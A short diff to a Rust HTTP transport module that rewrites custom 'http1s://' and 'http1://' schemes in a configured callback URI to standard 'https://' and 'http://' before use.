@@ -422,7 +422,10 @@ impl Transport for HTTP {
 
     fn new(config: Config) -> Result<Self> {
         // Extract URI and EXTRA from config using helper functions
-        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let c = crate::transport::extract_uri_from_config(&config)?;
+        let callback = c
+            .replace("http1s://", "https://")
+            .replace("http1://", "http://");
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
         #[cfg(feature = "doh")]
